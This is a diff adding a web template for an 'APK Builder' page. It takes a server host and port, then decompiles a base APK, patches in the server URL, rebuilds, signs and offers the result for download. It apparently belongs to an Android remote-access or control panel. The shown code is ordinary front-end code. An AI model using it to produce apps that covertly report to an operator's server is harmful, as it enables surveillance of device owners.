@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APK Builder</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
+        <div class="nav-links">
+            <a href="/">Dashboard</a>
+            <a href="/builder" class="active">Builder</a>
+            <a href="/logs">Logs</a>
+            <a href="/logout">Logout</a>
+        </div>
+    </nav>
+
+    <main class="container">
+        <div class="card builder-card">
+            <h2>APK Builder</h2>
+            <p class="subtitle">Configure and build your APK with custom server settings</p>
+            
+            <div class="form-group">
+                <label for="host">Server Host / IP</label>
+                <input type="text" id="host" placeholder="e.g., 192.168.1.100 or example.com" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="port">Server Port</label>
+                <input type="number" id="port" value="<%= port %>" placeholder="22533">
+            </div>
+            
+            <button id="buildBtn" class="btn primary">
+                <span class="icon">⚙</span> Build APK
+            </button>
+            
+            <div id="progress" class="progress-section hidden">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <p id="progressText">Preparing...</p>
+            </div>
+            
+            <div id="result" class="result-section hidden">
+                <div class="success-icon">✓</div>
+                <p>APK Built Successfully!</p>
+                <a href="/build.s.apk" class="btn success" download>
+                    <span class="icon">↓</span> Download APK
+                </a>
+            </div>
+            
+            <div id="error" class="error-section hidden">
+                <div class="error-icon">✕</div>
+                <p id="errorText">Build failed</p>
+            </div>
+        </div>
+        
+        <div class="card info-card">
+            <h3>Requirements</h3>
+            <ul>
+                <li>Java JDK 8+ must be installed</li>
+                <li>apktool.jar in factory folder</li>
+                <li>uber-apk-signer.jar in factory folder</li>
+            </ul>
+            <h3>Build Process</h3>
+            <ol>
+                <li>Decompile base APK</li>
+                <li>Patch server URL</li>
+                <li>Rebuild APK</li>
+                <li>Sign APK</li>
+            </ol>
+        </div>
+    </main>
+
+    <script>
+        const $ = id => document.getElementById(id);
+        const buildBtn = $('buildBtn');
+        const progress = $('progress');
+        const progressFill = $('progressFill');
+        const progressText = $('progressText');
+        const result = $('result');
+        const error = $('error');
+        const errorText = $('errorText');
+        
+        let polling = null;
+        
+        buildBtn.onclick = async () => {
+            const host = $('host').value.trim();
+            const port = $('port').value.trim();
+            
+            if (!host) {
+                alert('Please enter server host');
+                return;
+            }
+            if (!port) {
+                alert('Please enter server port');
+                return;
+            }
+            
+            // Reset UI
+            buildBtn.disabled = true;
+            buildBtn.innerHTML = '<span class="icon">⏳</span> Building...';
+            progress.classList.remove('hidden');
+            result.classList.add('hidden');
+            error.classList.add('hidden');
+            progressFill.style.width = '0%';
+            
+            // Start progress polling
+            polling = setInterval(async () => {
+                try {
+                    const res = await fetch('/builder/progress');
+                    const data = await res.json();
+                    const p = data.progress;
+                    
+                    // Calculate percentage based on step
+                    let pct = 0;
+                    if (p.step === 'decompile') pct = 15;
+                    else if (p.step === 'patch') pct = 35;
+                    else if (p.step === 'build') pct = 60;
+                    else if (p.step === 'sign') pct = 85;
+                    else if (p.step === 'done') pct = 100;
+                    
+                    progressFill.style.width = pct + '%';
+                    progressText.textContent = p.message || 'Processing...';
+                } catch (e) {}
+            }, 500);
+            
+            // Start build
+            try {
+                const res = await fetch(`/builder?host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}`, {
+                    method: 'POST'
+                });
+                const data = await res.json();
+                
+                clearInterval(polling);
+                
+                if (data.error) {
+                    progressFill.style.width = '100%';
+                    progressFill.style.background = 'var(--danger)';
+                    error.classList.remove('hidden');
+                    errorText.textContent = data.error;
+                } else {
+                    progressFill.style.width = '100%';
+                    progress.classList.add('hidden');
+                    result.classList.remove('hidden');
+                }
+            } catch (e) {
+                clearInterval(polling);
+                error.classList.remove('hidden');
+                errorText.textContent = e.message;
+            }
+            
+            buildBtn.disabled = false;
+            buildBtn.innerHTML = '<span class="icon">⚙</span> Build APK';
+        };
+    </script>
+</body>
+</html>
